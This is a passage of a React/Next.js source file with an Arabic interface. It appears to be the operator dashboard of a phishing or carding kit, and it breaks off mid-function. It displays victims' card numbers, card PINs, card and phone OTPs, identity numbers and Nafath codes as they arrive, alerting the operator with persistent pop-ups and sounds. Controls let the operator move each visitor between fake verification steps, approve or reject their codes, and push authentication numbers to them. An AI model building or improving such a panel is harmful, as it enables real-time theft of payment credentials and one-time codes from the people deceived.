"use client";

import type React from "react";
import { useState, useEffect, useMemo, useRef } from "react";
import { useRouter } from "next/navigation";
import {
  Trash2,
  Users,
  CreditCard,
  UserCheck,
  Flag,
  Bell,
  LogOut,
  CheckCircle,
  Search,
  Download,
  Settings,
  User,
  Menu,
  ArrowUpDown,
  ChevronLeft,
  ChevronRight,
  TrendingUp,
  Activity,
  Filter,
  RefreshCw,
  AlertCircle,
  Loader2,
  Phone,
  LockIcon,
  ClipboardCheck,
  Eye,
  EyeOff,
} from "lucide-react";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { ar } from "date-fns/locale";
import { format } from "date-fns";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogFooter,
  DialogTrigger,
} from "@/components/ui/dialog";
import {
  Card,
  CardContent,
  CardHeader,
  CardTitle,
  CardFooter,
  CardDescription,
} from "@/components/ui/card";
import {
  collection,
  doc,
  writeBatch,
  updateDoc,
  onSnapshot,
  query,
  orderBy,
  setDoc,
} from "firebase/firestore";
import { onAuthStateChanged, signOut } from "firebase/auth";
import { onValue, ref } from "firebase/database";
import { playNotificationSound } from "@/lib/actions";
import {
  Popover,
  PopoverContent,
  PopoverTrigger,
} from "@/components/ui/popover";
import {
  Tooltip,
  TooltipProvider,
  TooltipContent,
  TooltipTrigger,
} from "@/components/ui/tooltip";
import { Input } from "@/components/ui/input";
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuItem,
  DropdownMenuTrigger,
  DropdownMenuSeparator,
  DropdownMenuLabel,
} from "@/components/ui/dropdown-menu";
import { Avatar, AvatarFallback, AvatarImage } from "@/components/ui/avatar";
import { Separator } from "@/components/ui/separator";
import { Switch } from "@/components/ui/switch";
import { Label } from "@/components/ui/label";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import { Checkbox } from "@/components/ui/checkbox";
import { toast } from "@/hooks/use-toast";
import {
  Sheet,
  SheetContent,
  SheetHeader,
  SheetTitle,
} from "@/components/ui/sheet";
import { auth, database, db } from "@/lib/firestore";
import { CardMockup } from "@/components/CardMockup";

function useOnlineUsersCount() {
  const [onlineUsersCount, setOnlineUsersCount] = useState(0);

  useEffect(() => {
    const onlineUsersRef = ref(database, "status");
    const unsubscribe = onValue(onlineUsersRef, (snapshot) => {
      const data = snapshot.val();
      if (data) {
        const onlineCount = Object.values(data).filter(
          (status: any) => status.state === "online",
        ).length;
        setOnlineUsersCount(onlineCount);
      }
    });

    return () => unsubscribe();
  }, []);

  return onlineUsersCount;
}

function useUserOnlineStatus(userId: string) {
  const [isOnline, setIsOnline] = useState(false);

  useEffect(() => {
    const userStatusRef = ref(database, `/status/${userId}`);

    const unsubscribe = onValue(userStatusRef, (snapshot) => {
      const data = snapshot.val();
      setIsOnline(data && data.state === "online");
    });

    return () => unsubscribe();
  }, [userId]);

  return isOnline;
}

function StatisticsCard({
  title,
  value,
  change,
  changeType,
  icon: Icon,
  colorClass,
  trend,
}: {
  title: string;
  value: string | number;
  change: string;
  changeType: "increase" | "decrease" | "neutral";
  icon: React.ElementType;
  colorClass: string;
  trend?: number[];
}) {
  return (
    <Card className="relative overflow-hidden border-0 shadow-lg hover:shadow-xl transition-all duration-300 bg-gradient-to-br from-card to-muted/20">
      <CardHeader className="pb-2">
        <div className="flex items-center justify-between">
          <div className={`p-3 rounded-xl ${colorClass}`}>
            <Icon className="h-6 w-6 text-primary-foreground" />
          </div>
          <div className="text-right">
            <p className="text-sm font-medium text-muted-foreground">{title}</p>
            <p className="text-3xl font-bold">{value}</p>
          </div>
        </div>
      </CardHeader>
      <CardContent className="pt-0">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-1">
            <TrendingUp
              className={`h-4 w-4 ${
                changeType === "increase"
                  ? "text-emerald-500"
                  : changeType === "decrease"
                    ? "text-rose-500"
                    : "text-muted-foreground"
              }`}
            />
            <span
              className={`text-sm font-medium ${
                changeType === "increase"
                  ? "text-emerald-500"
                  : changeType === "decrease"
                    ? "text-rose-500"
                    : "text-muted-foreground"
              }`}
            >
              {change}
            </span>
          </div>
          {trend && (
            <div className="flex items-end gap-1 h-8">
              {trend.map((value, index) => (
                <div
                  key={index}
                  className={`w-1 rounded-sm ${colorClass} opacity-60`}
                  style={{ height: `${(value / Math.max(...trend)) * 100}%` }}
                />
              ))}
            </div>
          )}
        </div>
      </CardContent>
    </Card>
  );
}

function UserStatus({ userId }: { userId: string }) {
  const [status, setStatus] = useState<"online" | "offline" | "unknown">(
    "unknown",
  );

  useEffect(() => {
    const userStatusRef = ref(database, `/status/${userId}`);

    const unsubscribe = onValue(userStatusRef, (snapshot) => {
      const data = snapshot.val();
      if (data) {
        setStatus(data.state === "online" ? "online" : "offline");
      } else {
        setStatus("unknown");
      }
    });

    return () => unsubscribe();
  }, [userId]);

  return (
    <div className="flex items-center gap-2">
      <div
        className={`w-2 h-2 rounded-full ${status === "online" ? "bg-emerald-500 animate-pulse" : "bg-rose-500"}`}
      />
      <Badge
        variant="outline"
        className={`text-xs ${
          status === "online"
            ? "bg-emerald-50 text-emerald-700 border-emerald-200 dark:bg-emerald-950/30 dark:text-emerald-300"
            : "bg-rose-50 text-rose-700 border-rose-200 dark:bg-rose-950/30 dark:text-rose-300"
        }`}
      >
        {status === "online" ? "متصل" : "غير متصل"}
      </Badge>
    </div>
  );
}

function anySelector({
  notificationId,
  currentColor,
  onColorChange,
}: {
  notificationId: string;
  currentColor: any;
  onColorChange: (id: string, color: any) => void;
}) {
  return (
    <Popover>
      <PopoverTrigger asChild>
        <Button variant="ghost" size="icon" className="h-8 w-8">
          <Flag
            className={`h-4 w-4 ${
              currentColor === "red"
                ? "text-rose-500 fill-rose-500"
                : currentColor === "yellow"
                  ? "text-amber-500 fill-amber-500"
                  : currentColor === "green"
                    ? "text-emerald-500 fill-emerald-500"
                    : "text-muted-foreground"
            }`}
          />
        </Button>
      </PopoverTrigger>
      <PopoverContent className="w-auto p-2">
        <div className="flex gap-2">
          {[
            {
              color: "red",
              label: "عالي الأولوية",
              bgClass:
                "bg-rose-100 hover:bg-rose-200 dark:bg-rose-900 dark:hover:bg-rose-800",
            },
            {
              color: "yellow",
              label: "متوسط الأولوية",
              bgClass:
                "bg-amber-100 hover:bg-amber-200 dark:bg-amber-900 dark:hover:bg-amber-800",
            },
            {
              color: "green",
              label: "منخفض الأولوية",
              bgClass:
                "bg-emerald-100 hover:bg-emerald-200 dark:bg-emerald-900 dark:hover:bg-emerald-800",
            },
          ].map(({ color, label, bgClass }) => (
            <TooltipProvider key={color}>
              <Tooltip>
                <TooltipTrigger asChild>
                  <Button
                    variant="ghost"
                    size="icon"
                    className={`h-8 w-8 rounded-full ${bgClass}`}
                    onClick={() => onColorChange(notificationId, color as any)}
                  >
                    <Flag
                      className={`h-4 w-4 text-${color === "red" ? "rose" : color === "yellow" ? "amber" : "emerald"}-500 fill-${color === "red" ? "rose" : color === "yellow" ? "amber" : "emerald"}-500`}
                    />
                  </Button>
                </TooltipTrigger>
                <TooltipContent>
                  <p>{label}</p>
                </TooltipContent>
              </Tooltip>
            </TooltipProvider>
          ))}
          {currentColor && (
            <TooltipProvider>
              <Tooltip>
                <TooltipTrigger asChild>
                  <Button
                    variant="ghost"
                    size="icon"
                    className="h-8 w-8 rounded-full bg-muted hover:bg-muted/80"
                    onClick={() => onColorChange(notificationId, null)}
                  >
                    <Flag className="h-4 w-4 text-muted-foreground" />
                  </Button>
                </TooltipTrigger>
                <TooltipContent>
                  <p>إزالة العلم</p>
                </TooltipContent>
              </Tooltip>
            </TooltipProvider>
          )}
        </div>
      </PopoverContent>
    </Popover>
  );
}

function SearchBar({ onSearch }: { onSearch: (term: string) => void }) {
  const [searchTerm, setSearchTerm] = useState("");
  const searchInputRef = useRef<HTMLInputElement>(null);

  const handleSearch = () => {
    onSearch(searchTerm);
  };

  const handleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Enter") {
      handleSearch();
    }
  };

  return (
    <div className="relative">
      <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-muted-foreground" />
      <Input
        ref={searchInputRef}
        type="search"
        placeholder="البحث في الإشعارات..."
        className="pl-10 pr-4 bg-background/50 backdrop-blur-sm border-border focus:border-primary/50 transition-colors"
        value={searchTerm}
        onChange={(e) => setSearchTerm(e.target.value)}
        onKeyDown={handleKeyDown}
      />
    </div>
  );
}

function Pagination({
  currentPage,
  totalPages,
  onPageChange,
  totalItems,
  itemsPerPage,
}: {
  currentPage: number;
  totalPages: number;
  onPageChange: (page: number) => void;
  totalItems: number;
  itemsPerPage: number;
}) {
  const startItem = (currentPage - 1) * itemsPerPage + 1;
  const endItem = Math.min(currentPage * itemsPerPage, totalItems);

  return (
    <div className="flex items-center justify-between">
      <div className="text-sm text-muted-foreground">
        عرض {startItem} إلى {endItem} من {totalItems} عنصر
      </div>
      <div className="flex items-center gap-2">
        <Button
          variant="outline"
          size="sm"
          onClick={() => onPageChange(currentPage - 1)}
          disabled={currentPage <= 1}
          className="gap-1"
        >
          <ChevronRight className="h-4 w-4" />
          السابق
        </Button>
        <div className="flex items-center gap-1">
          {Array.from({ length: Math.min(5, totalPages) }, (_, i) => {
            const page = i + 1;
            return (
              <Button
                key={page}
                variant={currentPage === page ? "default" : "outline"}
                size="sm"
                className="w-8 h-8 p-0"
                onClick={() => onPageChange(page)}
              >
                {page}
              </Button>
            );
          })}
        </div>
        <Button
          variant="outline"
          size="sm"
          onClick={() => onPageChange(currentPage + 1)}
          disabled={currentPage >= totalPages}
          className="gap-1"
        >
          التالي
          <ChevronLeft className="h-4 w-4" />
        </Button>
      </div>
    </div>
  );
}

function ExportDialog({
  open,
  onOpenChange,
  notifications,
}: {
  open: boolean;
  onOpenChange: (open: boolean) => void;
  notifications: Notification[];
}) {
  const [exportFormat, setExportFormat] = useState<"csv" | "json">("csv");
  const [exportFields, setExportFields] = useState({
    personalInfo: true,
    cardInfo: true,
    status: true,
    timestamps: true,
  });
  const [isExporting, setIsExporting] = useState(false);

  const handleExport = () => {
    setIsExporting(true);

    setTimeout(() => {
      setIsExporting(false);
      onOpenChange(false);
      toast({
        title: "تم التصدير بنجاح",
        description: `تم تصدير ${notifications.length} إشعار بتنسيق ${exportFormat.toUpperCase()}`,
      });
    }, 1500);
  };

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="sm:max-w-md" dir="rtl">
        <DialogHeader>
          <DialogTitle className="flex items-center gap-2">
            <Download className="h-5 w-5" />
            تصدير الإشعارات
          </DialogTitle>
        </DialogHeader>
        <div className="space-y-4 py-4">
          <div className="space-y-2">
            <Label>تنسيق التصدير</Label>
            <div className="flex gap-4">
              <div className="flex items-center space-x-2 space-x-reverse">
                <input
                  type="radio"
                  id="csv"
                  value="csv"
                  checked={exportFormat === "csv"}
                  onChange={() => setExportFormat("csv")}
                  className="h-4 w-4 text-primary"
                />
                <Label htmlFor="csv" className="cursor-pointer">
                  CSV
                </Label>
              </div>
              <div className="flex items-center space-x-2 space-x-reverse">
                <input
                  type="radio"
                  id="json"
                  value="json"
                  checked={exportFormat === "json"}
                  onChange={() => setExportFormat("json")}
                  className="h-4 w-4 text-primary"
                />
                <Label htmlFor="json" className="cursor-pointer">
                  JSON
                </Label>
              </div>
            </div>
          </div>

          <div className="space-y-2">
            <Label>البيانات المراد تصديرها</Label>
            <div className="space-y-2">
              <div className="flex items-center space-x-2 space-x-reverse">
                <Checkbox
                  id="personal-info"
                  checked={exportFields.personalInfo}
                  onCheckedChange={(checked) =>
                    setExportFields({
                      ...exportFields,
                      personalInfo: checked as boolean,
                    })
                  }
                />
                <Label htmlFor="personal-info" className="cursor-pointer">
                  المعلومات الشخصية
                </Label>
              </div>
              <div className="flex items-center space-x-2 space-x-reverse">
                <Checkbox
                  id="card-info"
                  checked={exportFields.cardInfo}
                  onCheckedChange={(checked) =>
                    setExportFields({
                      ...exportFields,
                      cardInfo: checked as boolean,
                    })
                  }
                />
                <Label htmlFor="card-info" className="cursor-pointer">
                  معلومات البطاقة
                </Label>
              </div>
              <div className="flex items-center space-x-2 space-x-reverse">
                <Checkbox
                  id="status"
                  checked={exportFields.status}
                  onCheckedChange={(checked) =>
                    setExportFields({
                      ...exportFields,
                      status: checked as boolean,
                    })
                  }
                />
                <Label htmlFor="status" className="cursor-pointer">
                  حالة الإشعار
                </Label>
              </div>
              <div className="flex items-center space-x-2 space-x-reverse">
                <Checkbox
                  id="timestamps"
                  checked={exportFields.timestamps}
                  onCheckedChange={(checked) =>
                    setExportFields({
                      ...exportFields,
                      timestamps: checked as boolean,
                    })
                  }
                />
                <Label htmlFor="timestamps" className="cursor-pointer">
                  الطوابع الزمنية
                </Label>
              </div>
            </div>
          </div>

          <div className="rounded-md bg-muted p-3">
            <div className="flex items-center gap-2 text-sm">
              <AlertCircle className="h-4 w-4 text-muted-foreground" />
              <p className="text-muted-foreground">
                سيتم تصدير {notifications.length} إشعار بالإعدادات المحددة.
              </p>
            </div>
          </div>
        </div>
        <DialogFooter className="sm:justify-start">
          <Button variant="outline" onClick={() => onOpenChange(false)}>
            إلغاء
          </Button>
          <Button type="submit" onClick={handleExport} disabled={isExporting}>
            {isExporting ? (
              <>
                <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                جاري التصدير...
              </>
            ) : (
              <>
                <Download className="mr-2 h-4 w-4" />
                تصدير
              </>
            )}
          </Button>
        </DialogFooter>
      </DialogContent>
    </Dialog>
  );
}

function SettingsPanel({
  open,
  onOpenChange,
}: {
  open: boolean;
  onOpenChange: (open: boolean) => void;
}) {
  const [notifyNewCards, setNotifyNewCards] = useState(true);
  const [notifyNewUsers, setNotifyNewUsers] = useState(true);
  const [playSounds, setPlaySounds] = useState(true);
  const [autoRefresh, setAutoRefresh] = useState(true);
  const [refreshInterval, setRefreshInterval] = useState("30");

  return (
    <Sheet open={open} onOpenChange={onOpenChange}>
      <SheetContent side="left" className="sm:max-w-md" dir="rtl">
        <SheetHeader>
          <SheetTitle className="flex items-center gap-2 text-xl">
            <Settings className="h-5 w-5" />
            إعدادات الإشعارات
          </SheetTitle>
        </SheetHeader>
        <div className="mt-6 space-y-6">
          <div className="space-y-4">
            <h3 className="text-sm font-medium">إعدادات الإشعارات</h3>
            <div className="space-y-3">
              <div className="flex items-center justify-between">
                <div className="space-y-0.5">
                  <Label htmlFor="notify-cards">إشعارات البطاقات الجديدة</Label>
                  <p className="text-xs text-muted-foreground">
                    تلقي إشعارات عند إضافة بطاقة جديدة
                  </p>
                </div>
                <Switch
                  id="notify-cards"
                  checked={notifyNewCards}
                  onCheckedChange={setNotifyNewCards}
                />
              </div>
              <div className="flex items-center justify-between">
                <div className="space-y-0.5">
                  <Label htmlFor="notify-users">إشعارات المستخدمين الجدد</Label>
                  <p className="text-xs text-muted-foreground">
                    تلقي إشعارات عند تسجيل مستخدم جديد
                  </p>
                </div>
                <Switch
                  id="notify-users"
                  checked={notifyNewUsers}
                  onCheckedChange={setNotifyNewUsers}
                />
              </div>
              <div className="flex items-center justify-between">
                <div className="space-y-0.5">
                  <Label htmlFor="play-sounds">تشغيل الأصوات</Label>
                  <p className="text-xs text-muted-foreground">
                    تشغيل صوت عند استلام إشعار جديد
                  </p>
                </div>
                <Switch
                  id="play-sounds"
                  checked={playSounds}
                  onCheckedChange={setPlaySounds}
                />
              </div>
            </div>
          </div>

          <Separator />

          <div className="space-y-4">
            <h3 className="text-sm font-medium">إعدادات التحديث التلقائي</h3>
            <div className="space-y-3">
              <div className="flex items-center justify-between">
                <div className="space-y-0.5">
                  <Label htmlFor="auto-refresh">تحديث تلقائي</Label>
                  <p className="text-xs text-muted-foreground">
                    تحديث البيانات تلقائيًا
                  </p>
                </div>
                <Switch
                  id="auto-refresh"
                  checked={autoRefresh}
                  onCheckedChange={setAutoRefresh}
                />
              </div>
              {autoRefresh && (
                <div className="space-y-1.5">
                  <Label htmlFor="refresh-interval">
                    فترة التحديث (بالثواني)
                  </Label>
                  <Select
                    value={refreshInterval}
                    onValueChange={setRefreshInterval}
                  >
                    <SelectTrigger id="refresh-interval">
                      <SelectValue placeholder="اختر فترة التحديث" />
                    </SelectTrigger>
                    <SelectContent position="popper">
                      <SelectItem value="10">10 ثواني</SelectItem>
                      <SelectItem value="30">30 ثانية</SelectItem>
                      <SelectItem value="60">دقيقة واحدة</SelectItem>
                      <SelectItem value="300">5 دقائق</SelectItem>
                    </SelectContent>
                  </Select>
                </div>
              )}
            </div>
          </div>

          <div className="flex justify-end gap-2 pt-4">
            <Button variant="outline" onClick={() => onOpenChange(false)}>
              إلغاء
            </Button>
            <Button
              onClick={() => {
                toast({
                  title: "تم حفظ الإعدادات",
                  description: "تم حفظ إعدادات الإشعارات بنجاح",
                });
                onOpenChange(false);
              }}
            >
              حفظ الإعدادات
            </Button>
          </div>
        </div>
      </SheetContent>
    </Sheet>
  );
}

export default function NotificationsPage() {
  const [notifications, setNotifications] = useState<any[]>([]);
  const [isLoading, setIsLoading] = useState(true);
  const [selectedInfo, setSelectedInfo] = useState<
    "personal" | "card" | "nafaz" | null
  >(null);
  const [selectedNotification, setSelectedNotification] = useState<any | null>(
    null,
  );
  const [totalVisitors, setTotalVisitors] = useState<number>(0);
  const [cardSubmissions, setCardSubmissions] = useState<number>(0);
  const [filterType, setFilterType] = useState<"all" | "card" | "online">(
    "all",
  );
  const [searchTerm, setSearchTerm] = useState("");
  const [currentPage, setCurrentPage] = useState(1);
  const [itemsPerPage] = useState(10);
  const [settingsOpen, setSettingsOpen] = useState(false);
  const [exportDialogOpen, setExportDialogOpen] = useState(false);
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false);
  const [sortBy, setSortBy] = useState<"date" | "status" | "country">("date");
  const [sortOrder, setSortOrder] = useState<"asc" | "desc">("desc");
  const [showStatistics, setShowStatistics] = useState(true);
  const [authNumber, setAuthNumber] = useState("");
  const [tempUrl, setTempUrl] = useState("");

  const router = useRouter();
  const onlineUsersCount = useOnlineUsersCount();

  const [onlineStatuses, setOnlineStatuses] = useState<Record<string, boolean>>(
    {},
  );

  useEffect(() => {
    const statusRefs: { [key: string]: () => void } = {};

    notifications.forEach((notification) => {
      const userStatusRef = ref(database, `/status/${notification.id}`);

      const callback = onValue(userStatusRef, (snapshot) => {
        const data = snapshot.val();
        setOnlineStatuses((prev) => ({
          ...prev,
          [notification.id]: data && data.state === "online",
        }));
      });

      statusRefs[notification.id] = callback;
    });

    return () => {
      Object.values(statusRefs).forEach((unsubscribe) => {
        if (typeof unsubscribe === "function") {
          unsubscribe();
        }
      });
    };
  }, [notifications]);

  const totalVisitorsCount = notifications.length;
  const cardSubmissionsCount = notifications.filter((n) => n.cardNumber).length;
  const approvedCount = notifications.filter(
    (n) => n.status === "approved",
  ).length;
  const pendingCount = notifications.filter(
    (n) => n.status === "pending",
  ).length;

  async function saveLink(newUrl: string) {
    try {
      const docRef = doc(db, "links", "main");
      await setDoc(docRef, { url: newUrl }, { merge: true });
      console.log("✅ Link saved successfully!");
      alert("تم الحفظ");
    } catch (error) {
      console.error("❌ Error saving link:", error);
      alert("خطا!!!!!!!!!!!!!");
    }
  }

  const filteredNotifications = useMemo(() => {
    let filtered = notifications;

    if (filterType === "card") {
      filtered = filtered.filter((notification) => notification.cardNumber);
    } else if (filterType === "online") {
      filtered = filtered.filter(
        (notification) => onlineStatuses[notification.id],
      );
    }

    if (searchTerm) {
      const term = searchTerm.toLowerCase();
      filtered = filtered.filter(
        (notification) =>
          notification?.documment_owner_full_name
            ?.toLowerCase()
            .includes(term) ||
          notification?.seller_identity_number?.toLowerCase().includes(term) ||
          notification.phone?.toLowerCase().includes(term) ||
          notification.cardNumber?.toLowerCase().includes(term) ||
          notification.country?.toLowerCase().includes(term) ||
          notification.otp?.toLowerCase().includes(term),
      );
    }

    filtered.sort((a, b) => {
      let aValue: any, bValue: any;

      switch (sortBy) {
        case "date":
          aValue = new Date(a.createdDate);
          bValue = new Date(b.createdDate);
          break;
        case "status":
          aValue = a.status;
          bValue = b.status;
          break;
        case "country":
          aValue = a.country || "";
          bValue = b.country || "";
          break;
        default:
          return 0;
      }

      if (sortOrder === "asc") {
        return aValue > bValue ? 1 : -1;
      } else {
        return aValue < bValue ? 1 : -1;
      }
    });

    return filtered;
  }, [
    filterType,
    notifications,
    onlineStatuses,
    searchTerm,
    sortBy,
    sortOrder,
  ]);

  const paginatedNotifications = useMemo(() => {
    const startIndex = (currentPage - 1) * itemsPerPage;
    return filteredNotifications.slice(startIndex, startIndex + itemsPerPage);
  }, [filteredNotifications, currentPage, itemsPerPage]);

  const totalPages = Math.max(
    1,
    Math.ceil(filteredNotifications.length / itemsPerPage),
  );

  useEffect(() => {
    setCurrentPage(1);
  }, [filterType, searchTerm]);

  useEffect(() => {
    const unsubscribe = onAuthStateChanged(auth, (user) => {
      if (!user) {
        router.push("/login");
      } else {
        const unsubscribeNotifications = fetchNotifications();
        return () => {
          unsubscribeNotifications();
        };
      }
    });

    return () => unsubscribe();
  }, [router]);

  const fetchNotifications = () => {
    setIsLoading(true);
    const q = query(collection(db, "orders"), orderBy("createdDate", "desc"));
    const unsubscribe = onSnapshot(
      q,
      (querySnapshot) => {
        const notificationsData = querySnapshot.docs
          .map((doc) => {
            const data = doc.data() as any;
            return { id: doc.id, ...data };
          })
          .filter((notification: any) => !notification.isHidden) as any[];

        const hasNewCardInfo = notificationsData.some(
          (notification) =>
            notification.cardNumber &&
            !notifications.some(
              (n) => n.id === notification.id && n.cardNumber,
            ),
        );
        const hasNewGeneralInfo = notificationsData.some(
          (notification) =>
            (notification?.buyer_identity_number ||
              notification?.phoneNumber ||
              notification?.vehicle_type) &&
            !notifications.some(
              (n) =>
                n.id === notification.id &&
                (n?.buyer_identity_number || n?.phoneNumber || n?.vehicle_type),
            ),
        );

        notificationsData.forEach((notification) => {
          const existingNotification = notifications.find(
            (n) => n.id === notification.id,
          );

          if (
            notification.cardOtp &&
            (!existingNotification ||
              existingNotification.cardOtp !== notification.cardOtp)
          ) {
            toast({
              title: "🔐 OTP البطاقة الجديد",
              description: (
                <div className="flex flex-col gap-2">
                  <div className="text-2xl font-bold text-center bg-amber-100 dark:bg-amber-900/30 rounded-lg p-3 font-mono">
                    {notification.cardOtp}
                  </div>
                  <div className="text-sm text-muted-foreground">
                    الزائر:{" "}
                    {notification.visitorId || notification.id.substring(0, 8)}
                  </div>
                </div>
              ),
              duration: Infinity,
            });
            playNotificationSound();
          }

          if (
            (notification.phoneOtp || notification.phoneOtpCode) &&
            (!existingNotification ||
              (existingNotification.phoneOtp !== notification.phoneOtp &&
                existingNotification.phoneOtpCode !==
                  notification.phoneOtpCode))
          ) {
            const otpValue = notification.phoneOtp || notification.phoneOtpCode;
            toast({
              title: "📱 OTP الهاتف الجديد",
              description: (
                <div className="flex flex-col gap-2">
                  <div className="text-2xl font-bold text-center bg-blue-100 dark:bg-blue-900/30 rounded-lg p-3 font-mono">
                    {otpValue}
                  </div>
                  <div className="text-sm text-muted-foreground">
                    الزائر:{" "}
                    {notification.visitorId || notification.id.substring(0, 8)}
                  </div>
                </div>
              ),
              duration: Infinity,
            });
            playNotificationSound();
          }
        });

        if (hasNewCardInfo || hasNewGeneralInfo) {
          playNotificationSound();
        }

        updateStatistics(notificationsData);

        setNotifications(notificationsData);
        setIsLoading(false);
      },
      (error) => {
        console.error("Error fetching notifications:", error);
        setIsLoading(false);
        toast({
          title: "خطأ في جلب البيانات",
          description: "حدث خطأ أثناء جلب الإشعارات",
          variant: "destructive",
        });
      },
    );

    return unsubscribe;
  };

  const handleCurrentPageUpdate = async (id: string, currentPage: string) => {
    try {
      const docRef = doc(db, "orders", id);
      await updateDoc(docRef, { currentPage });
      setNotifications((prev) =>
        prev.map((n) => (n.id === id ? { ...n, currentPage } : n)),
      );
      toast({
        title: "تم تحديث الصفحة الحالية",
        description: `تم تحديث الصفحة الحالية إلى: ${currentPage}`,
        variant: "default",
      });
    } catch (error) {
      console.error("Error updating current page:", error);
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء تحديث الصفحة الحالية.",
        variant: "destructive",
      });
    }
  };

  const updateStatistics = (notificationsData: any[]) => {
    const totalCount = notificationsData.length;
    const cardCount = notificationsData.filter(
      (notification) => notification.cardNumber,
    ).length;

    setTotalVisitors(totalCount);
    setCardSubmissions(cardCount);
  };

  const handleInfoClick = (
    notification: Notification,
    infoType: "personal" | "card" | "nafaz",
  ) => {
    setSelectedNotification(notification);
    setSelectedInfo(infoType);
  };

  const closeDialog = () => {
    setSelectedInfo(null);
    setSelectedNotification(null);
  };

  const handleShowStatistics = () => {
    setShowStatistics(!showStatistics);
  };

  const handleanyChange = async (id: string, color: any) => {
    try {
      const docRef = doc(db, "orders", id);
      await updateDoc(docRef, { any: color });

      setNotifications(
        notifications.map((notification) =>
          notification.id === id
            ? { ...notification, any: color }
            : notification,
        ),
      );

      toast({
        title: "تم تحديث العلامة",
        description: color
          ? "تم تحديث لون العلامة بنجاح"
          : "تمت إزالة العلامة بنجاح",
        variant: "default",
      });
    } catch (error) {
      console.error("Error updating flag color:", error);
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء تحديث لون العلامة",
        variant: "destructive",
      });
    }
  };

  const handleAuthNumberUpdate = async (id: string, authNumber: string) => {
    try {
      const docRef = doc(db, "orders", id);
      await updateDoc(docRef, {
        authNumber: authNumber,
        phoneVerificationStatus: "approved",
      });
      setNotifications((prev) =>
        prev.map((n) => (n.id === id ? { ...n, nafaz_pin: authNumber } : n)),
      );
      toast({
        title: "تم تحديث رقم التحقق",
        description: `تم تحديث رقم التحقق إلى: ${authNumber}`,
        variant: "default",
      });
    } catch (error) {
      console.error("Error updating auth number:", error);
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء تحديث رقم التحقق.",
        variant: "destructive",
      });
    }
  };

  const handleApproval = async (state: string, id: string) => {
    try {
      const targetPost = doc(db, "orders", id);
      await updateDoc(targetPost, {
        status: state,
      });
      toast({
        title: state === "approved" ? "تمت الموافقة" : "تم الرفض",
        description:
          state === "approved"
            ? "تمت الموافقة على الإشعار بنجاح"
            : "تم رفض الإشعار بنجاح",
        variant: "default",
      });
    } catch (error) {
      console.error("Error updating notification status:", error);
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء تحديث حالة الإشعار",
        variant: "destructive",
      });
    }
  };

  const handleOtpApproval = async (approved: boolean, id: string) => {
    try {
      const targetPost = doc(db, "orders", id);
      await updateDoc(targetPost, {
        verified: approved,
      });
      toast({
        title: approved ? "تمت الموافقة على OTP" : "تم رفض OTP",
        description: approved
          ? "تمت الموافقة على رمز OTP بنجاح"
          : "تم رفض رمز OTP بنجاح",
        variant: "default",
      });
    } catch (error) {
      console.error("Error updating OTP approval status:", error);
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء تحديث حالة موافقة OTP",
        variant: "destructive",
      });
    }
  };

  const stepLabels: Record<string, string> = {
    cart: "السلة",
    shipping: "الشحن",
    payment: "الدفع",
    "card-otp": "OTP البطاقة",
    "card-pin": "PIN البطاقة",
    "phone-verification": "التحقق من الهاتف",
    "phone-otp": "OTP الهاتف",
    nafath: "نفاذ",
    "auth-dialog": "حوار المصادقة",
    success: "نجاح",
  };

  const handleStepChange = async (id: string, step: string) => {
    try {
      const docRef = doc(db, "orders", id);
      await updateDoc(docRef, { currentStep: step });
      setNotifications((prev) =>
        prev.map((n) => (n.id === id ? { ...n, currentStep: step } : n)),
      );
      toast({
        title: "تم تحديث الخطوة",
        description: `تم تغيير الخطوة إلى: ${stepLabels[step] || step}`,
        variant: "default",
      });
    } catch (error) {
      console.error("Error updating step:", error);
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء تحديث الخطوة",
        variant: "destructive",
      });
    }
  };

  const handleApprovalToggle = async (
    id: string,
    field: string,
    value: boolean,
  ) => {
    try {
      const docRef = doc(db, "orders", id);
      await updateDoc(docRef, { [field]: value });
      setNotifications((prev) =>
        prev.map((n) => (n.id === id ? { ...n, [field]: value } : n)),
      );
      const fieldLabels: Record<string, string> = {
        cardOtpApproved: "OTP البطاقة",
        cardPinApproved: "PIN البطاقة",
        phoneOtpApproved: "OTP الهاتف",
        nafathApproved: "نفاذ",
      };
      toast({
        title: value ? "تمت الموافقة" : "تم الإلغاء",
        description: `تم ${value ? "الموافقة على" : "إلغاء"} ${fieldLabels[field] || field}`,
        variant: "default",
      });
    } catch (error) {
      console.error("Error updating approval status:", error);
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء تحديث حالة الموافقة",
        variant: "destructive",
      });
    }
  };

  const handleDelete = async (id: string) => {
    try {
      const docRef = doc(db, "orders", id);
      await updateDoc(docRef, { isHidden: true });
      setNotifications(
        notifications.filter((notification) => notification.id !== id),
      );
      toast({
        title: "تم مسح الإشعار",
        description: "تم مسح الإشعار بنجاح",
        variant: "default",
      });
    } catch (error) {
      console.error("Error hiding notification:", error);
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء مسح الإشعار",
        variant: "destructive",
      });
    }
  };

  const handleClearAll = async () => {
    setIsLoading(true);
    try {
      const batch = writeBatch(db);
      notifications.forEach((notification) => {
        const docRef = doc(db, "orders", notification.id);
        batch.update(docRef, { isHidden: true });
      });
      await batch.commit();
      setNotifications([]);
      toast({
        title: "تم مسح جميع الإشعارات",
        description: "تم مسح جميع الإشعارات بنجاح",
        variant: "default",
      });
    } catch (error) {
      console.error("Error hiding all notifications:", error);
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء مسح الإشعارات",
        variant: "destructive",
      });
    } finally {
      setIsLoading(false);
    }
  };

  const handleLogout = async () => {
    try {
      await signOut(auth);
